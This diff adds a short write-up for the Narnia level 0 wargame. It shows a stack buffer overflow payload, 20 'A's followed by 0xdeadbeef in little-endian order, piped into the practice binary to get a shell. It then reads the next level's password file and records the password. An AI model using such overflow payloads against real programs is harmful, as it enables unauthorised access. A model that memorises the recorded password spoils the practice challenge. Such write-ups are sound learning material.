@@ -1,0 +1,20 @@
+char buf[20]; = 20 bytes
+
+need to fill up buf before overwriting with deadbeef.
+"A"*20 + 0xdeadbeef | 0x is just for hexadecimal
+The program is little endian so we have to 'reverse' deadbeef
+\xef\xbe\xad\xde
+
+---------------------
+python2 -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
+works, but the i/o stream is instantly closed.
+---------------------
+(python2 -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
+
+added cat as a i/o stream to keep the window open after.
+(this works in python2, but cannot get it to work with python3 for some reason)
+
+after successfull shell:
+cat /etc/narnia_pass/narnia1 for password
+
+Password: eaa6AjYMBB
